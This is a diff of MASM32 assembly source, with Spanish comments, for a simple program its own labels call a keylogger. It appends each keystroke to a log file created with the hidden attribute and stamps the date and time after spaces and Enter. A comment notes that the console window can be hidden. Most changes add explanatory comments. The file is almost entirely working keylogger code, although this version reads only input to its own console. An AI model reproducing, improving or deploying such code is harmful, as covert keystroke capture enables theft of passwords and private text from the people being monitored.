@@ -23,39 +23,33 @@ includelib \masm32\lib\user32.lib
 .data?
 	fechaBuf db 50 dup(?)
 	horaBuf db 50 dup(?)
-	manejo dd ?
-	consola dd ?
-	key dd ?
-	bytesw dd ?
+	manejo dd ?				;handler del archivo
+	consola dd ?			;handler de la consola
+	key dd ?				;caracter
+	bytesw dd ?				;bytes escritos
 
-	kb1	db 256 dup(?)
-	kb2	db 256 dup(?)
-;code segment
-.stack
 .code
 program:
 	call main
 
 	main proc
-		
 		invoke GetConsoleWindow
 		mov consola, eax
 		;0 = HIDE	5 = SHOW
 		invoke ShowWindow,consola,5
 
 		mov edx, offset directorio
-		
 		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN,NULL	
 		INVOKE SetFilePointer, eax, 0, 0, FILE_END
 
 		mov manejo, eax
 		cmp eax, INVALID_HANDLE_VALUE	;Error de creacion del archivo
-		je fin_programa
+		je fin_programa					;Si hay un handler inválido, cierra el programa
 
 		keylogger:
 
-		call crt__getch
-		
+		call crt__getch					;Obtiene el caracter presionado
+
 		mov key, eax
 		cmp eax, 0
 		je keylogger
@@ -63,16 +57,16 @@ program:
 		INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
 		mov manejo, eax
 		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
-		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
+		INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL	;Escritura del caracter
 		mov eax, manejo
 		INVOKE CloseHandle, eax
 		
 
-		mov ebx, key						;moviendo la entrada a la variable "key"
+		mov ebx, key						
 		cmp ebx, 20h						;si es un espacio
 		jz ObtenerFH
 		cmp ebx, 0dh						;si es un ENTER
-		jz ObtenerFH
+		jz ObtenerFH						;imprime la fecha y hora de impresion
 		jmp keylogger
 
 		ObtenerFH:
@@ -89,13 +83,11 @@ program:
 		invoke GetTimeFormat, 0, 0, \
 		0, addr formatohora, addr horaBuf, 50
 
-		INVOKE WriteFile,manejo,addr fechaBuf,11,addr bytesw,NULL
-		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL
+		INVOKE WriteFile,manejo,addr fechaBuf,11,addr bytesw,NULL	;Escritura del buffer de fecha
+		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL	;Escritura del buffer de hora
 
 		invoke CloseHandle, manejo
-		;.Until 0
 		jmp keylogger
-
 
 		fin_programa:
 
